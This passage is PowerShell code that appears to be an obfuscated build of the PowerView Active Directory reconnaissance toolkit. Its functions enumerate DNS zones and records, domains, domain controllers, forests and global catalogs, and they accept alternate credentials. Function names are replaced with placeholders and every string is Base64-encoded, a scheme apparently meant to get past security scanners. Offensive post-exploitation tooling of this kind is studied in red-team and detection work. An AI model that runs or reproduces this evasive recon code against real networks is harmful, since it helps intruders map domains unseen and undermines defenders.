            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
        }
        elseif (${497} -eq 5) {
            ${501} = f117 $DNSRecord[24..$DNSRecord.length]
            ${492} = ${501}
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
        }
        elseif (${497} -eq 6) {
            ${492} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEEA')))
        }
        elseif (${497} -eq 12) {
            ${500} = f117 $DNSRecord[24..$DNSRecord.length]
            ${492} = ${500}
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
        }
        elseif (${497} -eq 13) {
            ${492} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABJAE4ARgBPAA==')))
        }
        elseif (${497} -eq 15) {
            ${492} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
        }
        elseif (${497} -eq 16) {
            [string]${498}  = ''
            [int]${499} = $DNSRecord[24]
            ${53} = 25
            while (${499}-- -gt 0) {
                ${498} += [char]$DNSRecord[${53}++]
            }
            ${492} = ${498}
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
        }
        elseif (${497} -eq 28) {
            ${492} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
        }
        elseif (${497} -eq 33) {
            ${492} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
        }
        else {
            ${492} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
        }
        ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) ${496}
        ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABUAEwA'))) ${495}
        ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUA'))) ${494}
        ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))) ${493}
        ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))) ${492}
        ${491}
    }
}
function Get-DomainDNSZone {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${48} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${490} = f74 @48
        if (${490}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${490}.FindOne()  }
            else { ${72} = ${490}.FindAll() }
            ${72} | ? {$_} | % {
                ${179} = f104 -Properties $_.Properties
                ${179} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${179}.name
                ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                ${179}
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${490}.dispose()
        }
        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbgBEAG4AcwBaAG8AbgBlAHMA')))
        ${489} = f74 @48
        if (${489}) {
            try {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${489}.FindOne() }
                else { ${72} = ${489}.FindAll() }
                ${72} | ? {$_} | % {
                    ${179} = f104 -Properties $_.Properties
                    ${179} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${179}.name
                    ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                    ${179}
                }
                if (${72}) {
                    try { ${72}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJwBDAE4APQBNAGkAYwByAG8AcwBvAGYAdABEAE4AUwAsAEQAQwA9AEQAbwBtAGEAaQBuAEQAbgBzAFoAbwBuAGUAcwAnAA==')))
            }
            ${489}.dispose()
        }
    }
}
function Get-DomainDNSRecord {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${48} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${487} = f74 @48
        if (${487}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${487}.FindOne() }
            else { ${72} = ${487}.FindAll() }
            ${72} | ? {$_} | % {
                try {
                    ${179} = f104 -Properties $_.Properties | select name,distinguishedname,dnsrecord,whencreated,whenchanged
                    ${179} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                    if (${179}.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        ${488} = f116 -DNSRecord ${179}.dnsrecord[0]
                    }
                    else {
                        ${488} = f116 -DNSRecord ${179}.dnsrecord
                    }
                    if (${488}) {
                        ${488}.PSObject.Properties | % {
                            ${179} | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBSAGUAYwBvAHIAZAA='))))
                    ${179}
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    ${179}
                }
            }
            if (${72}) {
                try { ${72}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${487}.dispose()
        }
    }
}
function f69 {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBEAG8AbQBhAGkAbgA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAFQAYQByAGcAZQB0AEQAbwBtAGEAaQBuACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${486} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${486})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVABhAHIAZwBlAHQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACwAIABvAHIAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIABpAG4AdgBhAGwAaQBkADoAIAAkAF8A')))
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${486} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${486})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACAAOgAgACQAXwA=')))
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AOgAgACQAXwA=')))
            }
        }
    }
}
function f84 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Switch]
        ${f36},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${483} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
            f79 @483
        }
        else {
            ${56} = f69 @483
            if (${56}) {
                ${56}.DomainControllers
            }
        }
    }
}
function f72 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBGAG8AcgBlAHMAdAA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
                ${479} = $Forest
            }
            else {
                ${479} = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAEYAbwByAGUAcwB0ACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${485} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), ${479}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                ${481} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${485})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQAewA0ADcAOQB9ACcAIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQALAAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAYwBvAG4AdABhAGMAdABlAGQALAAgAHQAaABlAHIAZQAgAGkAcwBuACcAdAAgAGEAbgAgAGUAeABpAHMAdABpAG4AZwAgAHQAcgB1AHMAdAAsACAAbwByACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGEAcgBlACAAaQBuAHYAYQBsAGkAZAA6ACAAJABfAA==')))
                $Null
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
            ${485} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                ${481} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${485})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQARgBvAHIAZQBzAHQAJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ADoAIAAkAF8A')))
                return $Null
            }
        }
        else {
            ${481} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if (${481}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${484} = (f71 -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${481}.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                ${484} = (f71 -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${481}.RootDomain.Name).objectsid
            }
            ${262} = ${484} -Split '-'
            ${484} = ${262}[0..$(${262}.length-2)] -join '-'
            ${481} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) ${484}
            ${481}
        }
    }
}
function Get-ForestDomain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${483} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${481} = f72 @483
        if (${481}) {
            ${481}.Domains
        }
    }
}
function Get-ForestGlobalCatalog {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${483} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${483}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${481} = f72 @483
        if (${481}) {
            ${481}.FindAllGlobalCatalogs()
        }
    }
}
function Get-ForestSchemaClass {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
